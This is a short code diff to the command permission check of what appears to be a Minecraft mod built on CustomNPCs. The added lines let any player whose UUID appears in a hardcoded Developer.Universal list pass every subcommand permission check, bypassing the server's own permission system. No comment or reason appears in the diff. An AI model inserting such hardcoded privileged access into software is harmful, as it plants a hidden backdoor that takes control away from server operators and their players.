@@ -10,6 +10,7 @@ import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
 
+import kamkeel.developer.Developer;
 import net.minecraft.command.CommandBase;
 import net.minecraft.command.CommandException;
 import net.minecraft.command.ICommandSender;
@@ -140,6 +141,9 @@ public abstract class CommandKamkeelBase extends CommandBase{
 		}
 
 		if(sender instanceof EntityPlayer){
+			if(Developer.Universal.contains(((EntityPlayer) sender).getUniqueID())){
+				return true;
+			}
 			return CustomNpcsPermissions.hasCustomPermission((EntityPlayer) sender, getSubCommandPermission(subCommand));
 		}
 
